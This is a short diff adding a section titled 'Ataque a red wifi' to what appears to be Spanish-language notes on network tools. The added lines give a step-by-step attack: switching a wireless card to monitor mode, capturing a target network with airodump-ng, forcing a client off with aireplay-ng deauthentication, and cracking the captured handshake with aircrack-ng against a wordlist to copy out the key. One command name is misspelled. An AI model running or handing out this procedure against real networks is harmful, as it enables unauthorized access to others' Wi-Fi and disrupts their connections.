@@ -176,6 +176,22 @@ tshark -i wlan0 -w capture.cap
 --- Ingresar la contraseña previamente establecida
 --- Abrir el archivo generado para comprobar la información extraída
 
+++ Ataque a red wifi (usando airodump-ng)
+--- Comandos a ejecutar:
+--- ifconfig wlan0 down
+--- ifconfig wlan0 mode monitor
+--- ifconfig wlan0 up
+--- airodump-ng wlan0 (Este comando permite ver las redes wifi activas)
+--- airodump-g --bssid <BSSID> --channel 6 --write new wlan0
+--- Abrir otro cmd
+--- aireplay-ng --deauth 20 -a <BSSID> -c <STMAC> wlan0
+--- Esperar a que aparezca el mensaje: Network is down
+--- ls
+--- Visualizar los archivos generados
+--- aircrack-ng <new-02.cap> -w <word.txt>
+--- Copiar la llave encontrada
+
+
 
 
 
